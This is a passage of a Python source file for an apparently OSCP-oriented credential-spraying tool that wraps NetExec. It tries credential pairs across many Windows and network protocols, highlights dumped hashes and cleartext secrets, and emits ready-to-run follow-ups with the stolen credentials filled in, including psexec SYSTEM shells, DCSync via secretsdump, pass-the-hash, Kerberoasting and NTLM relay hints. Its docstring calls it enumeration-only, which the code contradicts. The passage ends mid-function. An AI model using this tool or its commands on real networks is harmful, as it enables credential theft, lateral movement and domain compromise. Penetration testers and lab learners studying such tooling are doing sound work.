#!/usr/bin/env python3
"""
nxc_plus — credential spray & enumeration wrapper around NetExec (nxc)

Runs nxc across multiple protocols and credential pairs, surfaces hits with
suggested follow-up commands, and optionally outputs a ready-to-run shell
script.  Never exploits — enumeration only.

Requires: nxc (NetExec) on PATH.  pip install netexec
"""
import argparse
import ipaddress
import json
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Iterable

# ─── Tee — mirror stdout to file ───────────────────────────────────────
_ANSI_RE = re.compile(r"\033\[[0-9;]*[mABCDEFGHJKSTfnsulh]")

# NetExec sometimes spews a multi-line Rich traceback / error (broken pipe,
# access-denied mid-enum, unsupported op). Those lines have no nxc prefix and
# no [*]/[-]/[+] marker, so _parse_nxc_findings lets them through — which once
# made a failed --shares render as "shares (106)" of traceback. Treat them as
# noise. Real share/SAM/LSA/GPP result lines never contain these tokens.
_NXC_NOISE_RE = re.compile(
    r"[│╭╮╰╯├┤❱┌┐└┘┄┈]"                     # rich traceback frame / box drawing
    r"|Traceback \(most recent call last\)"
    r"|\[Errno \d+\]"                          # OSError text
    r"|Broken pipe"
    r"|\b\w+\.py:\d+\b"                         # python source ref (connection.py:187)
    r"|^\[\d\d:\d\d:\d\d\]\s+(?:ERROR|CRITICAL)"  # nxc timestamped error line
    r"|^(?:ERROR|CRITICAL)\b"
)
def _is_nxc_noise(line: str) -> bool:
    return bool(_NXC_NOISE_RE.search(line))

def _nxc_errored(stdout: str) -> bool:
    """True when nxc emitted a hard error/traceback (not just a [-] miss)."""
    s = _ANSI_RE.sub("", stdout)
    return ("Traceback (most recent call last)" in s or "[Errno" in s
            or re.search(r"\]\s+(?:ERROR|CRITICAL)\b", s) is not None)


class Tee:
    """Mirror sys.stdout to a file with ANSI codes stripped."""
    def __init__(self, path: str) -> None:
        self._file   = open(path, "w", encoding="utf-8", errors="replace")
        self._stdout = sys.__stdout__
    def write(self, data: str) -> int:
        self._stdout.write(data)
        self._file.write(_ANSI_RE.sub("", data))
        return len(data)
    def flush(self) -> None:
        self._stdout.flush(); self._file.flush()
    def isatty(self) -> bool:
        return self._stdout.isatty()
    def fileno(self) -> int:
        return self._stdout.fileno()
    def close(self) -> None:
        sys.stdout = self._stdout
        self._file.flush(); self._file.close()


# ─── Colors ────────────────────────────────────────────────────────────
RED = GREEN = YELLOW = BLUE = CYAN = ORANGE = BOLD = DIM = RESET = ""
_COLOR_CODES = {
    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
    "BLUE": "\033[94m", "CYAN": "\033[96m", "ORANGE": "\033[38;5;208m",
    "BOLD": "\033[1m", "DIM": "\033[2m",   "RESET": "\033[0m",
}

def configure_colors(no_color: bool) -> None:
    if no_color or not sys.stdout.isatty():
        return
    for name, code in _COLOR_CODES.items():
        globals()[name] = code


# "#" comment tags in the output — highlighted orange so labels stand out
# from the commands beneath them.
_COMMENT_RE = re.compile(r"#[^\n]*")
def hl_comment(text: str, base: str = "") -> str:
    if not ORANGE:
        return text
    return _COMMENT_RE.sub(lambda m: f"{ORANGE}{m.group(0)}{RESET}{base}", text)

# NT hash (32 hex) or LM:NT pair — highlighted orange in dumped output so the
# crackable/PtH-able hashes stand out.
_HASH_RE = re.compile(r"\b[a-fA-F0-9]{32}(?::[a-fA-F0-9]{32})?\b")
def hl_hash(text: str, base: str = "") -> str:
    if not ORANGE:
        return text
    return _HASH_RE.sub(lambda m: f"{ORANGE}{m.group(0)}{RESET}{base}", text)


# ─── Protocol config ───────────────────────────────────────────────────
ALL_PROTOCOLS      = ["smb","ssh","ldap","ftp","wmi","winrm","rdp","vnc","mssql","nfs"]
LOCAL_AUTH_PROTOS  = {"smb","wmi","winrm","rdp","mssql"}
WINDOWS_PROTOS     = {"smb","winrm","wmi","rdp","mssql","ldap"}

PROTOCOL_PORTS = {
    "smb":445,"ssh":22,"ldap":389,"ftp":21,"wmi":135,
    "winrm":5985,"rdp":3389,"vnc":5900,"mssql":1433,"nfs":2049,
}

# port -> one-line OSCP next-step hint ({ip} is filled in)
PORT_HINTS = {
    21:  "anonymous login? ftp {ip}  (try anonymous:anonymous); check version for exploits",
    22:  "ssh — grab banner; brute only if you have a userlist: hydra -L u -P p ssh://{ip}",
    23:  "telnet {ip} — cleartext, grab banner",
    25:  "smtp user enum: smtp-user-enum -M VRFY -U users.txt -t {ip}",
    53:  "DNS — try zone transfer: dig axfr @{ip} {domain}",
    80:  "web: whatweb http://{ip}; gobuster dir -u http://{ip} -w dirb/common.txt; nikto -h http://{ip}",
    88:  "KERBEROS = Domain Controller. kerbrute userenum --dc {ip} -d {domain} names.txt; AS-REP roast",
    110: "pop3 — nc {ip} 110, try creds",
    111: "rpcbind/NFS: rpcinfo {ip}; showmount -e {ip}",
    135: "msrpc: impacket-rpcdump {ip} | grep -i ncacn",
    139: "netbios/smb: enum4linux-ng {ip}; nxc smb {ip}",
    143: "imap — nc {ip} 143",
    161: "SNMP (udp): snmpwalk -v2c -c public {ip}  (try public/private)",
    389: "ldap: nxc ldap {ip}; ldapsearch -x -H ldap://{ip} -s base namingcontexts",
    443: "https: whatweb https://{ip}; gobuster dir -u https://{ip} -k -w common.txt; nikto -h https://{ip}",
    445: "SMB: nxc smb {ip} --shares; smbclient -L //{ip} -N; enum4linux-ng {ip}  (nxc3 auto-enums shares/SAM/LSA on a valid login)",
    873: "rsync: rsync -av --list-only rsync://{ip}/  (list modules, often anon-readable); then pull a module's files",
    1433:"mssql: nxc mssql {ip}; impacket-mssqlclient {user}:{pass}@{ip}  (try sa)",
    1521:"oracle TNS: odat sidguesser -s {ip}; odat all -s {ip}  (SID brute then creds)",
    2049:"NFS: showmount -e {ip}; mount -t nfs {ip}:/<share> /mnt",
    3306:"mysql: mysql -h {ip} -u root  (try no password)",
    3389:"RDP: nxc rdp {ip}; xfreerdp3 /v:{ip} /u:{user} /p:{pass} /cert:ignore",
    5432:"postgres: psql -h {ip} -U postgres",
    5900:"VNC: vncviewer {ip}  (often no/weak auth)",
    5985:"WinRM: nxc winrm {ip}; evil-winrm -i {ip} -u {user} -p {pass}",
    5986:"WinRM/TLS: nxc winrm {ip}; evil-winrm -i {ip} -u {user} -p {pass} -S  (ignore cert)",
    6379:"redis: redis-cli -h {ip}  (often unauth); try CONFIG GET dir / module load",
    8080:"web-alt: whatweb http://{ip}:8080; gobuster dir -u http://{ip}:8080 -w common.txt  (Tomcat? /manager, default creds)",
    8443:"https-alt: whatweb https://{ip}:8443; nikto -h https://{ip}:8443  (ManageEngine/AppManager etc — check for default creds + CVEs by product/version)",
    11211:"memcached: nc {ip} 11211 then 'stats'/'version'; memcdump --servers={ip}  (unauth data)",
    27017:"mongodb: mongosh mongodb://{ip}  (often no auth); show dbs",
}

DEFAULT_WORKERS          = 15
DEFAULT_TARGET_WORKERS   = 3
NETEXEC_TIMEOUT          = 30
SUBPROCESS_TIMEOUT       = 45
PORT_PROBE_TIMEOUT       = 2.0
MAX_CONSECUTIVE_TIMEOUTS = 3
DEFAULT_MAX_CIDR_HOSTS   = 1024
DEFAULT_SPRAY_DELAY      = 0     # no delay by default (OSCP boxes have no lockout)
WORDLIST                 = "/usr/share/wordlists/rockyou.txt"


# ─── Data classes ──────────────────────────────────────────────────────
class AuthType(str, Enum):
    PASSWORD = "password"
    HASH     = "hash"
    KERBEROS = "kerberos"


@dataclass(frozen=True)
class Cred:
    user: str; secret: str; auth_type: AuthType
    @property
    def is_hash(self) -> bool:     return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS


@dataclass
class Success:
    protocol: str; local_auth: bool; domain: str; user: str
    secret: str; auth_type: AuthType
    is_admin: bool = False; is_guest: bool = False; raw_message: str = ""
    @property
    def is_hash(self) -> bool:     return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
    @property
    def scope(self) -> str:  return "local" if self.local_auth else "domain"
    @property
    def label(self) -> str:  return f"{self.protocol.upper()} ({self.scope})"


@dataclass
class TargetResult:
    target: str
    real_ip: str = ""; hostname: str = ""; domain: str = ""
    is_dc: bool = False; elapsed: float = 0.0
    open_protocols:   list[str]  = field(default_factory=list)
    closed_protocols: list[str]  = field(default_factory=list)
    successes:        list[Success] = field(default_factory=list)
    guests:           list[Success] = field(default_factory=list)
    anon_smb: bool = False
    anon_smb_lines:   list[str]  = field(default_factory=list)
    share_lines:      list[str]  = field(default_factory=list)   # auto-enum shares
    protocol_lines:   dict[str, list[tuple[str,str]]] = field(default_factory=dict)
    target_info: str = ""; scanned: bool = True; skipped_reason: str = ""
    nmap_ports: list[tuple[int,str,str]] = field(default_factory=list)  # (port, service, version)
    cred_enum:  list[tuple[str,list[str]]] = field(default_factory=list)  # credentialed enum sections
    pivot_subnets: list[str] = field(default_factory=list)   # dual-homed → hidden nets
    domain_users:  list[str] = field(default_factory=list)   # clean usernames (for spray/roast)
    plaintext:     list[str] = field(default_factory=list)   # cleartext creds from LSA/GPP
    loot_hashes:   list[str] = field(default_factory=list)   # NTLM user:rid:lm:nt:::


# ─── CME-style formatter ───────────────────────────────────────────────
_PROTO_W = 12; _IP_W = 16; _PORT_W = 7; _HOST_W = 17

def _cme_prefix(proto: str, ip: str, port: int|str, hostname: str) -> str:
    return (f"{proto.upper():<{_PROTO_W}}"
            f"{ip:<{_IP_W}}"
            f"{str(port):<{_PORT_W}}"
            f"{(hostname or ip)[:(_HOST_W-1)]:<{_HOST_W}}")

def cme_line(proto,ip,port,hostname,marker,msg,color="") -> str:
    prefix = _cme_prefix(proto,ip,port,hostname)
    body   = f"{marker} {msg}"
    return f"{prefix}{color}{body}{RESET}" if color else f"{prefix}{body}"

def _marker_color(marker: str) -> str:
    return {"[+]":GREEN,"[-]":RED,"[*]":CYAN,"[!]":YELLOW}.get(marker,"")

def print_cme(proto,ip,port,hostname,marker,msg) -> None:
    print(cme_line(proto,ip,port,hostname,marker,msg,color=_marker_color(marker)),flush=True)

def print_info(marker: str, msg: str, indent: int = 0) -> None:
    color = _marker_color(marker)
    body  = f"{'  '*indent}{marker} {hl_comment(msg, color)}"
    print(f"{color}{body}{RESET}" if color else body, flush=True)

_SEP_W = min(max(shutil.get_terminal_size((100, 24)).columns, 64), 140)
_SEP = f"{DIM}{'─'*_SEP_W}{RESET}"


# ─── nxc output parsing ────────────────────────────────────────────────
def parse_nxc_line(line: str) -> tuple[str|None,str]:
    for m in ("[+]","[-]","[*]","[!]"):
        idx = line.find(m)
        if idx != -1:
            return m, line[idx+4:].strip()
    return None, line.strip()

def parse_success_message(msg: str) -> tuple[str,str,str,bool,bool]:
    cleaned = msg.strip()
    is_admin = is_guest = False
    m = re.search(r"\s*\(([^()]*)\)\s*$", cleaned)
    if m:
        flag = m.group(1).lower()
        if   "guest" in flag:                 is_guest = True
        elif "pwn3d" in flag or "adm" in flag: is_admin = True
        cleaned = cleaned[:m.start()].rstrip()
    if not cleaned or ":" not in cleaned:
        return "", cleaned, "", is_admin, is_guest
    head, secret = cleaned.split(":", 1)
    if "\\" in head:
        domain, user = head.split("\\", 1)
    else:
        domain, user = "", head
    return domain.strip(), user.strip(), secret, is_admin, is_guest

def extract_ipv4(text: str) -> str|None:
    m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
    return m.group(0) if m else None

def looks_like_dc(info: str) -> bool:
    if not info: return False
    m = re.search(r"name:([^\s)]+)", info, re.IGNORECASE)
    if not m: return False
    return bool(re.search(r"\bdc\d*\b|^dc|pdc|addc", m.group(1).lower()))

def extract_ssh_hostname(info: str) -> str:
    """Extract hostname from SSH banners if possible."""
    patterns = [
        r"name:([^\s)]+)",
        r"hostname[:=]\s*([^\s]+)",
        r"server[:=]\s*([^\s]+)",
    ]
    for pattern in patterns:
        m = re.search(pattern, info, re.IGNORECASE)
        if m:
            return m.group(1).upper()
    return ""

def extract_hostname(info: str) -> str:
    if not info:
        return ""
    m = re.search(r"name:([^\s)]+)", info, re.IGNORECASE)
    if m:
        return m.group(1).upper()
    return extract_ssh_hostname(info)

def extract_domain(info: str) -> str:
    # The NetBIOS/local name sits on "(local)" lines and is NOT the Kerberos
    # realm. Skip those so we keep the FQDN (e.g. corp.local), not the short name.
    if "(local)" in info.lower():
        return ""
    m = re.search(r"domain:([^\s)]+)", info, re.IGNORECASE)
    return m.group(1) if m else ""


# ─── Shell-safe quoting ────────────────────────────────────────────────
def q(v: str|None) -> str:
    if v is None or v == "": return "''"
    return shlex.quote(str(v))


# ─── Honest privilege label ────────────────────────────────────────────
def privilege_label(is_guest: bool, is_admin: bool,
                    is_dc: bool, local_auth: bool) -> tuple[str, str]:
    """Qualifier shown next to a successful login, kept honest:
    Pwn3d on a DC with a domain cred ~ Domain Admin; Pwn3d on a member = Local
    Admin of that host; a guest mapping is not real auth; else a plain valid user.
    Returns (ansi_color_prefix, bracket_text)."""
    if is_guest:
        return (YELLOW, "[guest]")
    if is_admin and is_dc and not local_auth:
        return (RED + BOLD, "[DOMAIN ADMIN — admin on the DC!]")
    if is_admin:
        return (GREEN + BOLD, "[LOCAL ADMIN — Pwn3d on this host]")
    who = "local user" if local_auth else "domain user"
    return (GREEN, f"[valid — {who}]")


# ─── Suggested commands ────────────────────────────────────────────────
def build_suggestions(s: Success, ip: str, hostname: str,
                      is_dc: bool, extra_hash: str|None) -> list[tuple[str,str]]:
    proto  = s.protocol
    user   = s.user or ""
    domain = s.domain or ""
    secret = s.secret or ""
    pth_hash = secret if s.is_hash else (extra_hash or "")

    qip = q(ip); quser = q(user); qdom = q(domain) if domain else "''"
    qpw = q(secret) if not s.is_hash else "''"
    if domain:
        url_pw   = f"{domain}/{user}:{secret}@{ip}"
        url_nopw = f"{domain}/{user}@{ip}"
    else:
        url_pw   = f"{user}:{secret}@{ip}"
        url_nopw = f"{user}@{ip}"
    qurl_pw   = q(url_pw);   qurl_nopw = q(url_nopw)
    qfqdn     = q(f"{hostname}.{domain}" if hostname and domain else (hostname or ip))
    qhash     = q(pth_hash) if pth_hash else "''"
    if domain and not s.is_hash:  qsmb_user = q(f"{domain}\\{user}%{secret}")
    elif not s.is_hash:           qsmb_user = q(f"{user}%{secret}")
    else:                         qsmb_user = q(f"{domain}\\{user}" if domain else user)

    e: list[tuple[str,str]] = []

    if s.auth_type == AuthType.PASSWORD:
        if proto == "smb":
            # shares/SAM/LSA are auto-pulled by cred-enum above, so suggest only
            # what is NOT already done — and gate admin-only actions on is_admin.
            if is_dc:
                if s.is_admin:   # admin on the DC == DCSync the whole domain
                    e.append(("secretsdump -just-dc (DCSync)",
                                  f"impacket-secretsdump -just-dc {qurl_pw}"))
                e.append(("smbclient (interactive)",
                              f"smbclient //{ip}/<SHARE> -U {qsmb_user}"))
            else:
                if s.is_admin:   # Pwn3d — get a SYSTEM shell / reuse creds elsewhere
                    e += [("psexec (SYSTEM shell)",
                               f"impacket-psexec {qurl_pw}"),
                          ("secretsdump (re-dump / other hosts)",
                               f"impacket-secretsdump {qurl_pw}")]
                else:            # plain user — hunt readable shares for creds
                    e += [("enum4linux-ng",
                               f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
                          ("spider shares for creds",
                               f"nxc smb {qip} -u {quser} -p {qpw} -M spider_plus")]
                e.append(("smbclient (interactive)",
                              f"smbclient //{ip}/<SHARE> -U {qsmb_user}"))
        elif proto == "winrm":
            e.append(("evil-winrm", f"evil-winrm -i {qip} -u {quser} -p {qpw}"))
        elif proto == "wmi":
            e.append(("wmiexec",    f"impacket-wmiexec {qurl_pw}"))
        elif proto == "rdp":
            e.append(("xfreerdp3",
                       f"xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
                       f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
        elif proto == "mssql":
            e.append(("mssqlclient",
                       f"impacket-mssqlclient {qurl_pw} -windows-auth"))
        elif proto == "ldap" and is_dc:
            e += [("kerbrute userenum",
                       f"kerbrute userenum --dc {qip} -d {qdom} "
                       f"/usr/share/seclists/Usernames/Names/names.txt"),
                  ("AS-REP roast",
                       f"impacket-GetNPUsers {qdom}/{quser}:{qpw} "
                       f"-request -format hashcat -outputfile asrep.hash -dc-ip {qip}"),
                  ("Kerberoast",
                       f"impacket-GetUserSPNs -request -dc-ip {qip} "
                       f"{qdom}/{quser}:{qpw} -outputfile kerb.hash"),
                  ("BloodHound",
                       f"bloodhound-python -u {quser} -p {qpw} -d {qdom} "
                       f"-dc {qfqdn} -ns {qip} -c All --zip"),
                  ("ldapdomaindump",
                       f"ldapdomaindump -u "
                       f"{q(domain+chr(92)+user) if domain else quser} "
                       f"-p {qpw} {qip}")]
        elif proto == "ldap":
            e.append(("ldapdomaindump",
                       f"ldapdomaindump -u "
                       f"{q(domain+chr(92)+user) if domain else quser} "
                       f"-p {qpw} {qip}"))
        elif proto == "ssh":
            e.append(("ssh",
                       f"ssh -o UserKnownHostsFile=/dev/null "
                       f"-o StrictHostKeyChecking=no {q(user+'@'+ip)}"))
        elif proto == "ftp":
            e += [("ftp (active)",   f"ftp -A {qip}"),
                  ("wget recursive", f"wget -r ftp://{q(user)}:{q(secret)}@{ip}/")]
        elif proto == "vnc":
            e.append(("vncviewer", f"vncviewer {qip}"))
        elif proto == "nfs":
            e += [("showmount",   f"showmount -e {qip}"),
                  ("mount NFS",   f"sudo mkdir -p /mnt/nfs && "
                                  f"sudo mount -t nfs -o nolock,vers=3 "
                                  f"{ip}:<EXPORT> /mnt/nfs")]
    elif s.auth_type == AuthType.HASH:
        ha = q(pth_hash) if pth_hash else "NT"
        if proto == "smb":
            # shares auto-pulled by cred-enum; gate admin-only PtH actions.
            if is_dc:
                if s.is_admin:
                    e.append(("secretsdump -just-dc [PtH] (DCSync)",
                                  f"impacket-secretsdump -just-dc {qurl_nopw} -hashes :{ha}"))
                e.append(("smbclient [PtH]",
                              f"nxc smb {qip} -u {quser} -H {qhash} --shares  # then smbclient -N / --pw-nt-hash"))
            else:
                if s.is_admin:
                    e += [("psexec [PtH] (SYSTEM shell)",
                               f"impacket-psexec {qurl_nopw} -hashes :{ha}"),
                          ("wmiexec [PtH]",
                               f"impacket-wmiexec {qurl_nopw} -hashes :{ha}"),
                          ("secretsdump [PtH] (other hosts)",
                               f"impacket-secretsdump {qurl_nopw} -hashes :{ha}")]
                else:
                    e.append(("spider shares for creds [PtH]",
                                  f"nxc smb {qip} -u {quser} -H {qhash} -M spider_plus"))
        elif proto == "winrm":
            e.append(("evil-winrm [PtH]",
                       f"evil-winrm -i {qip} -u {quser} -H {qhash}"))
        elif proto == "wmi":
            e.append(("wmiexec [PtH]",
                       f"impacket-wmiexec {qurl_nopw} -hashes :{ha}"))
        elif proto == "rdp":
            e.append(("xfreerdp3 [PtH]",
                       f"xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
                       f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
        elif proto == "mssql":
            e.append(("mssqlclient [PtH]",
                       f"impacket-mssqlclient {qurl_nopw} -hashes :{ha} -windows-auth"))
        elif proto == "ldap" and is_dc:
            e += [("BloodHound [PtH]",
                       f"bloodhound-python -u {quser} --hashes :{ha} "
                       f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"),
                  ("Kerberoast [PtH]",
                       f"impacket-GetUserSPNs -request -dc-ip {qip} "
                       f"-hashes :{ha} {qdom}/{quser} -outputfile kerb.hash")]
        elif proto == "ldap":
            e.append(("getTGT",
                       f"impacket-getTGT {qdom}/{quser} -hashes :{ha}"))
    elif s.auth_type == AuthType.KERBEROS:
        if proto == "smb":
            e.append(("psexec -k", f"impacket-psexec -k -no-pass {qurl_nopw}"))
            if is_dc:
                e.append(("secretsdump -k",
                           f"impacket-secretsdump -just-dc -k -no-pass {qurl_nopw}"))
        elif proto == "winrm":
            e.append(("evil-winrm -r",
                       f"evil-winrm -i {qip} -u {quser} -r {qdom}"))
        elif proto == "ldap" and is_dc:
            e.append(("BloodHound -k",
                       f"bloodhound-python -u {quser} -k --no-pass "
                       f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"))
    return e


# ─── Display ───────────────────────────────────────────────────────────
def print_suggested_commands(result: TargetResult, extra_hash: str|None) -> None:
    if not result.successes:
        return
    ip   = result.real_ip or result.target
    host = result.hostname or ip
    dc_note = " [DC]" if result.is_dc else ""

    def sort_key(s: Success) -> tuple[int,int]:
        try: return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
        except ValueError: return (len(ALL_PROTOCOLS), int(s.local_auth))

    seen: set[tuple[str,AuthType]] = set()
    blocks: list[tuple[str,list[tuple[str,str]]]] = []
    for s in sorted(result.successes, key=sort_key):
        k = (s.protocol, s.auth_type)
        if k in seen: continue
        seen.add(k)
        try:
            entries = build_suggestions(s, ip=ip, hostname=result.hostname,
                                        is_dc=result.is_dc, extra_hash=extra_hash)
        except Exception as exc:
            entries = [("error", f"# builder failed: {exc}")]
        if entries:
            hdr = s.protocol.upper()
            if s.auth_type == AuthType.HASH:      hdr += "/PtH"
            elif s.auth_type == AuthType.KERBEROS: hdr += "/Kerberos"
            blocks.append((hdr, entries))

    if not blocks:
        return
    print_info("[*]", f"suggested next steps  {host}{dc_note}")
    print(flush=True)
    for proto_hdr, entries in blocks:
        print(f"  [{proto_hdr}]", flush=True)
        for sub_label, cmd in entries:
            print(f"    {ORANGE}# {sub_label}{RESET}", flush=True)
            print(f"    {cmd}",        flush=True)
        print(flush=True)


def print_target_block(result: TargetResult, extra_hash: str|None,
                       verbose: bool) -> None:
    ip   = result.real_ip or result.target
    host = result.hostname or result.target

    has_hits   = bool(result.successes or result.guests or result.anon_smb)
    has_errors = any(m == "[!]"
                     for lines in result.protocol_lines.values()
                     for m, _ in lines)
    has_info = any(m == "[*]"
                   for lines in result.protocol_lines.values()
                   for m, _ in lines)
    if (not has_hits and not has_errors and not has_info
            and not result.nmap_ports and not verbose):
        return

    print(f"\n\n{_SEP}", flush=True)

    if result.target_info:
        dc_flag = " [DC]" if result.is_dc else ""
        print_cme("SMB", ip, 445, host, "[*]", result.target_info + dc_flag)
        print(_SEP, flush=True)          # rule under the banner — boxes the host
    print(flush=True)

    # ── nmap service scan + per-port next steps ────────────────────────
    if result.nmap_ports:
        is_dc = result.is_dc or any(p == 88 for p, _, _ in result.nmap_ports)
        hdr = f"open ports ({len(result.nmap_ports)})" + ("  [DC]" if is_dc else "")
        print(f"\n  {CYAN}[*]{RESET} {hdr}", flush=True)
        for port, svc, ver in result.nmap_ports:
            line = f"      {GREEN}{port:>5}/tcp{RESET}  {svc:<12}"
            if ver: line += f"  {DIM}{ver}{RESET}"
            print(line, flush=True)
        # next steps for the ports we recognise — but skip the generic recon hint
        # for any protocol we already authenticated to (the [PROTO] suggested
        # block + credentialed enum below already cover those, in depth).
        authed_ports = {PROTOCOL_PORTS[s.protocol] for s in result.successes
                        if s.protocol in PROTOCOL_PORTS}
        if any(s.protocol == "smb" for s in result.successes):
            authed_ports |= {139, 445}
        hints = [(p, PORT_HINTS[p]) for p, _, _ in result.nmap_ports
                 if p in PORT_HINTS and p not in authed_ports]
        if hints:
            # fill in domain/user/pass from what we actually have, so the
            # commands are copy-paste ready instead of showing placeholders
            win = next((s for s in result.successes if not s.is_guest), None)
            dom = result.domain or "<domain>"
            usr = (win.user if win else "") or "<user>"
            pw  = (win.secret if (win and not win.is_hash) else "") or "<pass>"
            def fill(h: str) -> str:
                return (h.replace("{ip}", ip).replace("{domain}", dom)
                         .replace("{user}", usr).replace("{pass}", pw))
            print(f"\n  {CYAN}[*]{RESET} next steps  {DIM}(ports not yet cracked){RESET}", flush=True)
            for port, hint in hints:
                print(f"      {ORANGE}# {port}{RESET}  {fill(hint)}", flush=True)
        print(flush=True)

    # ── notable config flags (worth investigating — NOT auto-vulns) ─────
    info = result.target_info or ""
    notes = []
    if "SMBv1:True" in info:
        notes.append(("SMBv1 enabled (legacy)",
                      f"check MS17-010: nxc smb {ip} -M ms17-010  (verify before trusting)"))
    if "Null Auth:True" in info:
        notes.append(("null-session allowed",
                      f"enum without creds: nxc smb {ip} -u '' -p '' --shares --users --rid-brute"))
    if "signing:False" in info:
        notes.append(("SMB signing not required",
                      "relay candidate: ntlmrelayx with a coercion (PetitPotam/printerbug)"))
    if notes:
        print(f"  {YELLOW}[!]{RESET} notable (investigate — not proven vulnerable):", flush=True)
        for what, how in notes:
            print(f"      {YELLOW}# {what}{RESET}  {how}", flush=True)
        print(flush=True)
    elif result.open_protocols or result.target_info or result.successes:
        # host-identity echo — only for a host we actually protocol-scanned.
        # A pure nmap-recon host (non-nxc ports only) is already identified by
        # its "open ports" block above; don't fake an SMB line for it.
        proto = (result.open_protocols[0] if result.open_protocols else "smb").upper()
        port  = PROTOCOL_PORTS.get(result.open_protocols[0]
                                   if result.open_protocols else "smb", 0)
        print_cme(proto, ip, port, host or ip, "[*]", ip)
        print(flush=True)

    def iprint(marker: str, msg: str, indent: int = 1) -> None:
        color = _marker_color(marker)
        body  = f"{'  '*indent}{marker} {hl_comment(msg, color)}"
        print(f"{color}{body}{RESET}" if color else body, flush=True)

    def sort_key(s: Success) -> tuple[int,int]:
        try: return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
        except ValueError: return (len(ALL_PROTOCOLS), int(s.local_auth))

    all_hits = sorted(result.successes, key=sort_key)
    if all_hits:
        for s in all_hits:
            scope = "local" if s.local_auth else "domain"
            auth  = s.auth_type.value if s.auth_type != AuthType.PASSWORD else "password"
            tag   = f"{s.protocol.upper()}/{scope}/{auth}"
            col, label = privilege_label(s.is_guest, s.is_admin,
                                         result.is_dc, s.local_auth)
            qual = f"  {col}{label}{RESET}"
            iprint("[+]", f"{s.raw_message}   [{tag}]{qual}")
        print(flush=True)

    # ── credentialed enumeration actually pulled with the winning cred ──
    if result.cred_enum:
        for label, lines in result.cred_enum:
            tag = f"{RED}" if "SAM" in label or "LSA" in label else f"{CYAN}"
            print(f"  {tag}[+]{RESET} {label} ({len(lines)}):", flush=True)
            for ln in lines[:60]:
                print(f"      {hl_hash(ln)}", flush=True)
        print(flush=True)

    seen_info: set[tuple[str, str]] = set()
    for proto in ALL_PROTOCOLS:
        for scope in (False, True):
            key   = f"{proto}-{'local' if scope else 'domain'}"
            lines = result.protocol_lines.get(key)
            if not lines: continue
            sn = " (local)" if scope else ""
            for marker, msg in lines:
                if marker == "[!]":               iprint("[!]", msg + sn)
                elif marker == "[-]" and verbose: iprint("[-]", msg + sn)
                elif marker == "[*]":
                    info_key = (proto, msg)
                    if info_key in seen_info:
                        continue
                    seen_info.add(info_key)
                    iprint("[*]", f"{proto.upper()} {msg}" + sn)

    if result.anon_smb and result.successes:
        # Already authenticated — null session is a notable finding, not a
        # to-do list (we've enumerated with real creds already).
        iprint("[!]", "null session also allowed (anonymous SMB) — "
                      "unauth users can enumerate this host", )
        print(flush=True)
    elif result.anon_smb:
        iprint("[*]", "anonymous SMB — next steps")
        print(flush=True)
        for label, cmd in [
            ("list shares",           f"smbclient -L //{ip} -N"),
            ("connect to a share",    f"smbclient //{ip}/<SHARE> -N"),
            ("enum4linux-ng",         f"enum4linux-ng -A {ip}"),
            ("nxc shares",   f"nxc smb {ip} -u '' -p '' --shares"),
            ("recursive pull SYSVOL", f"smbclient //{ip}/SYSVOL -N -c "
                                      f"'recurse ON; prompt OFF; mget *'"),
        ]:
            print(f"      {ORANGE}# {label}{RESET}", flush=True)
            print(f"      {cmd}",    flush=True)
            print(flush=True)

    if result.share_lines:
        iprint("[*]", "shares (auto-enumerated)")
        print(flush=True)
        for line in result.share_lines:
            print(f"      {line}", flush=True)
        print(flush=True)

    if result.guests:
        iprint("[!]", "guest mapping  (map to guest = bad user, not real auth)")
        for s in result.guests:
            iprint("[!]", s.raw_message + (" (local)" if s.local_auth else ""), indent=2)
        print(flush=True)

    if result.successes:
        print(flush=True)
        print_suggested_commands(result, extra_hash)


# ─── Input handling ────────────────────────────────────────────────────
def read_value_or_file(source: str) -> list[str]:
    if os.path.isfile(source):
        try:
            with open(source) as f:
                return [l.strip() for l in f if l.strip()]
        except OSError as exc:
            raise ValueError(f"Cannot read '{source}': {exc}") from exc
    return [source]

def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
    out: list[str] = []; seen: set[str] = set()
    for raw in specs:
        spec = raw.strip()
        if not spec: continue
        if "/" in spec:
            try:
                net = ipaddress.ip_network(spec, strict=False)
            except ValueError:
                if spec not in seen: seen.add(spec); out.append(spec)
                continue
            if net.num_addresses > max_hosts:
                raise ValueError(f"{spec} expands to {net.num_addresses} hosts "
                                 f"(cap: {max_hosts}). Use --max-cidr-hosts.")
            hosts = ([net.network_address] if net.num_addresses == 1
                     else list(net.hosts()))
            for h in hosts:
                addr = str(h)
                if addr not in seen: seen.add(addr); out.append(addr)
        else:
            if spec not in seen: seen.add(spec); out.append(spec)
    return out

def parse_protocol_list(spec: str|None) -> list[str]:
    if not spec: return list(ALL_PROTOCOLS)
    items   = {s.strip().lower() for s in spec.split(",") if s.strip()}
    unknown = items - set(ALL_PROTOCOLS)
    if unknown:
        raise ValueError(f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
                         f"Valid: {', '.join(ALL_PROTOCOLS)}")
    return [p for p in ALL_PROTOCOLS if p in items]


# ─── Port probe ────────────────────────────────────────────────────────
def tcp_probe(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=PORT_PROBE_TIMEOUT):
            return True
    except (OSError, socket.timeout):
        return False

def probe_protocols(host: str, protos: list[str]) -> list[str]:
    open_set: set[str] = set()
